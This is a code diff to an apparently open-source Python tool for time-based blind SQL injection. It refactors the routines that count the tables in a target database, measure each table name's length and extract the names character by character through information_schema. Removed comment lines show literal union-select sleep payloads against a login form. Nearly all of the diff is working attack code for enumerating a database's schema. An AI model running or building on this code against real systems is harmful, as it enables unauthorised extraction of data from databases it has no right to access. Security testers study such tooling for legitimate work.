@@ -5,6 +5,7 @@ from lib.log import logger
 from database import SqliDatabases
 from tqdm import trange
 from lib.dealpayload import build_injection
+from lib.dealpayload import time_injection
 
 __author__ = "LoRexxar"
 
@@ -127,16 +128,12 @@ class SqliTables(SqliDatabases):
                     logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                     logger.debug("Start table amount sqli...")
 
-                    for i in trange(100, desc='Table amount sqli', leave=False):
-                        # 先注tables的数量
-                        # payload = "user=ddog' union SELECT 1,if((SELECT COUNT(table_name) from information_schema.tables WHERE table_schema = '" + database_name + "' limit 0,1) > " + repr(i) + ",sleep(" + repr(self.time) + "),0)%23&passwd=ddog123&submit=Log+In"
-                        payload = self.dealpayload.construct_time_payload(select="COUNT(table_name)",
-                                                                          source="information_schema.tables",
-                                                                          conditions="table_schema = '" + database_name + "'",
-                                                                          compare=i)
-                        if self.Data.GetTimeData(payload, self.time) == 0:
-                            tables_number = i
-                            break
+                    retVal = time_injection(select="COUNT(table_name)",
+                                            source="information_schema.tables",
+                                            conditions="table_schema = '" + database_name + "'",
+                                            dealpayload=self.dealpayload, data=self.Data, times=self.time,
+                                            isCount=True, sqlirequest=self.sqlirequest)
+                    tables_number = int(retVal)
 
                     logger.debug("Tables amount sqli success...The tables_number is %d..." % tables_number)
                     logger.info("[*] tables_number: %d" % tables_number)
@@ -144,18 +141,14 @@ class SqliTables(SqliDatabases):
                     for i in range(0, int(tables_number)):
                         # 然后注tables_number 的length
                         logger.debug("Start %dth table length sqli..." % (i + 1))
-                        for j in trange(50, desc="%dth Table length sqli..." % (i + 1), leave=False):
-                            payload = self.dealpayload.construct_time_payload(select="length(table_name)",
-                                                                              source="information_schema.tables",
-                                                                              conditions="table_schema = '" + database_name + "'",
-                                                                              limit=i,
-                                                                              compare=j)
-                            if self.Data.GetTimeData(payload, self.time) == 0:
-                                table_name_len = j
-                                break
-                            elif j == 50:
-                                logger.error("Table length > 50...")
-                                table_name_len = 50
+
+                        retVal = time_injection(select="length(table_name)",
+                                                source="information_schema.tables",
+                                                conditions="table_schema = '" + database_name + "'",
+                                                limit=i,
+                                                dealpayload=self.dealpayload, data=self.Data, times=self.time,
+                                                isCount=True, sqlirequest=self.sqlirequest)
+                        table_name_len = int(retVal)
 
                         logger.debug("%dth Table name length sqli success...The table_name_len is %d..." % ((i + 1), table_name_len))
                         logger.info("[*] %dth table_name_len: %d" % ((i + 1), table_name_len))
@@ -164,19 +157,15 @@ class SqliTables(SqliDatabases):
                         # 清空table_name
                         table_name = ""
                         logger.debug("Start %dth table sqli..." % (i + 1))
+
                         for j in trange(int(table_name_len), desc='%dth Table sqli' % (i + 1), leave=False):
-                            for k in trange(100, desc='%dth Table\'s %dth char sqli' % ((i + 1), (j + 1)),
-                                            leave=False):
-                                # payload = "user=ddog' union SELECT 1,if((SELECT  ascii(substring(table_name," + repr(j + 1) + ",1)) from information_schema.tables WHERE table_schema = '" + database_name + "' limit " + repr(i) + ",1) > " + repr(k + 30) + ",sleep(" + repr(self.time) + "),0)%23&passwd=ddog123&submit=Log+In"
-                                payload = self.dealpayload.construct_time_payload(
-                                    select="ascii(substring(table_name," + repr(j + 1) + ",1))",
-                                    source="information_schema.tables",
-                                    conditions="table_schema = '" + database_name + "'",
-                                    limit=i,
-                                    compare=(k + 30))
-                                if self.Data.GetTimeData(payload, self.time) == 0:
-                                    table_name += chr(int(k + 30))
-                                    break
+                            retVal = time_injection(select="ascii(substring(table_name," + repr(j + 1) + ",1))",
+                                                    source="information_schema.tables",
+                                                    conditions="table_schema = '" + database_name + "'",
+                                                    limit=i,
+                                                    dealpayload=self.dealpayload, data=self.Data, times=self.time,
+                                                    isStrings=True, sqlirequest=self.sqlirequest)
+                            table_name += chr(retVal)
 
                         logger.debug("%dth Table name sqli success...The table_name is %s..." % ((i + 1), table_name))
 
@@ -288,18 +277,12 @@ class SqliTables(SqliDatabases):
                     logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                     logger.debug("Start table amount sqli...")
 
-                    for i in trange(100, desc='Table amount sqli', leave=False):
-
-                        # 先注tables的数量
-                        # payload = {"user": "admi' union SELECT 1,if((SELECT COUNT(table_name) from information_schema.tables WHERE table_schema = '" + database_name + "' limit 0,1) > " + repr(
-                        #     i) + ",sleep(" + repr(self.time) + "),0)#", "passwd": "ddog123"}
-                        payload = self.dealpayload.construct_time_payload(select="count(table_name)",
-                                                                          source="information_schema.tables",
-                                                                          conditions="table_schema = '" + database_name + "'",
-                                                                          compare=i)
-                        if self.Data.PostTimeData(payload, self.time) == 0:
-                            tables_number = i
-                            break
+                    retVal = time_injection(select="COUNT(table_name)",
+                                            source="information_schema.tables",
+                                            conditions="table_schema = '" + database_name + "'",
+                                            dealpayload=self.dealpayload, data=self.Data, times=self.time,
+                                            isCount=True, sqlirequest=self.sqlirequest)
+                    tables_number = int(retVal)
 
                     logger.debug("Tables amount sqli success...The tables_number is %d..." % tables_number)
                     logger.info("[*] tables_number: %d" % tables_number)
@@ -307,20 +290,13 @@ class SqliTables(SqliDatabases):
                     for i in range(0, int(tables_number)):
                         # 然后注tables_number 的length
                         logger.debug("Start %dth table length sqli..." % (i + 1))
-                        for j in trange(50, desc="%dth Table length sqli..." % (i + 1), leave=False):
-                            # payload = {"user": "admi' union SELECT 1,if((SELECT length(table_name) from information_schema.tables WHERE table_schema = '" + database_name + "' limit " + repr(
-                            #     i) + ",1) > " + repr(j) + ",sleep(" + repr(self.time) + "),0)#", "passwd": "ddog123"}
-                            payload = self.dealpayload.construct_time_payload(select="length(table_name)",
-                                                                              source="information_schema.tables",
-                                                                              conditions="table_schema = '" + database_name + "'",
-                                                                              limit=i,
-                                                                              compare=j)
-                            if self.Data.PostTimeData(payload, self.time) == 0:
-                                table_name_len = j
-                                break
-                            elif j == 50:
-                                logger.error("Table length > 50...")
-                                table_name_len = 50
+                        retVal = time_injection(select="length(table_name)",
+                                                source="information_schema.tables",
+                                                conditions="table_schema = '" + database_name + "'",
+                                                limit=i,
+                                                dealpayload=self.dealpayload, data=self.Data, times=self.time,
+                                                isCount=True, sqlirequest=self.sqlirequest)
+                        table_name_len = int(retVal)
 
                         logger.debug("%dth Table name length sqli success...The table_name_len is %d..." % ((i + 1), table_name_len))
                         logger.info("[*] %dth table_name_len: %d" % ((i + 1), table_name_len))
@@ -329,21 +305,15 @@ class SqliTables(SqliDatabases):
                         # 清空table_name
                         table_name = ""
                         logger.debug("Start %dth table sqli..." % (i + 1))
+
                         for j in trange(int(table_name_len), desc='%dth Table sqli' % (i + 1), leave=False):
-                            for k in trange(100, desc='%dth Table\'s %dth char sqli' % ((i + 1), (j + 1)),
-                                            leave=False):
-                                # payload = {"user": "admi' union SELECT 1,if((SELECT  ascii(substring(table_name," + repr(
-                                #     j + 1) + ",1)) from information_schema.tables WHERE table_schema = '" + database_name + "' limit " + repr(
-                                #     i) + ",1) > " + repr(k + 30) + ",sleep(" + repr(self.time) + "),0)#", "passwd": "ddog123"}
-                                payload = self.dealpayload.construct_time_payload(
-                                    select="ascii(substring(table_name," + repr(j + 1) + ",1))",
-                                    source="information_schema.tables",
-                                    conditions="table_schema = '" + database_name + "'",
-                                    limit=i,
-                                    compare=(k + 30))
-                                if self.Data.PostTimeData(payload, self.time) == 0:
-                                    table_name += chr(int(k + 30))
-                                    break
+                            retVal = time_injection(select="ascii(substring(table_name," + repr(j + 1) + ",1))",
+                                                    source="information_schema.tables",
+                                                    conditions="table_schema = '" + database_name + "'",
+                                                    limit=i,
+                                                    dealpayload=self.dealpayload, data=self.Data, times=self.time,
+                                                    isStrings=True, sqlirequest=self.sqlirequest)
+                            table_name += chr(retVal)
 
                         logger.debug("%dth Table name sqli success...The table_name is %s..." % ((i + 1), table_name))
 
